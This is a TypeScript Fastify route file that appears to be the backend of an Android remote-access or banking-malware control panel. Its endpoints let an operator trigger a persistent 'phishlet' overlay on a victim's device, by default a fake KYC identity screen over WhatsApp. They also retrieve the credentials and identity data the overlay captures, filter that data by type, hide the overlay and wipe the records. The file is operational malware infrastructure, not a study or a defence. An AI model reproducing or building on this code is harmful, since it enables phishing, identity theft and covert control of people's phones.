import type { FastifyInstance } from 'fastify';
import { getDb, dbHelpers } from '../db/index.js';
import { phishletData, phishletTemplates, clients } from '../db/schema.js';
import { eq, desc, and } from 'drizzle-orm';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import { log } from '../utils/logger.js';
import { socketService } from '../services/socket.js';
import { CMD } from '../types/index.js';

export async function phishletRoutes(app: FastifyInstance) {
  // Get captured phishlet data for a device
  app.get('/api/client/:id/phishlet/data', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const d = getDb();
    const data = d.select().from(phishletData).where(eq(phishletData.clientId, id)).orderBy(desc(phishletData.capturedAt)).all();
    return { success: true, data };
  });

  // Get phishlet data by type
  app.get('/api/client/:id/phishlet/data/:type', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const { id, type } = request.params as { id: string; type: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const d = getDb();
    const data = d.select().from(phishletData)
      .where(and(eq(phishletData.clientId, id), eq(phishletData.phishletType, type)))
      .orderBy(desc(phishletData.capturedAt)).all();
    return { success: true, data };
  });

  // Trigger phishlet on device
  app.post('/api/client/:id/phishlet/trigger', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const body = request.body as any;
    socketService.sendCommand(id, CMD.PHISHLET, {
      action: 'phishlet_show',
      phishletType: body.type || 'kyc',
      package: body.package || 'com.whatsapp',
      template: body.template || 'kyc_identity',
      persistent: body.persistent ?? true,
    });
    return { success: true, data: { message: 'Phishlet triggered' } };
  });

  // Hide phishlet
  app.post('/api/client/:id/phishlet/hide', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    socketService.sendCommand(id, CMD.PHISHLET, { action: 'phishlet_hide' });
    return { success: true, data: { message: 'Phishlet hidden' } };
  });

  // Delete phishlet data
  app.delete('/api/client/:id/phishlet/data', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const d = getDb();
    d.delete(phishletData).where(eq(phishletData.clientId, id)).run();
    return { success: true, data: { message: 'Phishlet data cleared' } };
  });
}

function canAccessDevice(user: any, deviceId: string): boolean {
  if (user.role === 'admin') return true;
  const d = getDb();
  const client = d.select({ ownerId: clients.ownerId }).from(clients).where(eq(clients.id, deviceId)).get();
  return client?.ownerId === user.userId;
}
